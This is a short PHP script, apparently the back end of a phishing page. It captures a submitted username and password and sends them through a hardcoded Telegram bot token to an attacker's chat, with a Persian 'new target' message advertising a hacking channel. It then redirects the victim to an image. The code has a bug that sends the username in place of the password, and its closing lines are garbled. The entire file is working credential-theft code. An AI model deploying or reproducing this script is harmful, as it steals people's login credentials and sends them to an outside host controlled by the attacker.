<?php 
$msg_user= $_POST['username'];
$msg_pass= $_POST['password'];


$admin = 5117664900;
$token = "6046282989:AAGikjpeSSsCypT_kCNqYyQIZx39TlM760I";

define('API_KEY',"$token");
function bot($method,$datas=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

if (!empty($_POST)) {
bot('sendmessage', [
'chat_id'=>$admin,
'text'=>"❕اطلاعات تارگت جدید😎👊
🌐 یوزرنیم : $msg_user
🌐 پسوورد : $msg_user

کانال تلگرام ما : 
🆔 @AMIR_HACK
⚙erfanCyberiR
", 
]);
} 

?>
<meta content='0;url=https://s6.uupload.ir/files/img-20220513-wa0083_4xw.jpg<?php ?>' http-equiv='refresh'/>
?php ?>' http-equiv='refresh'/>
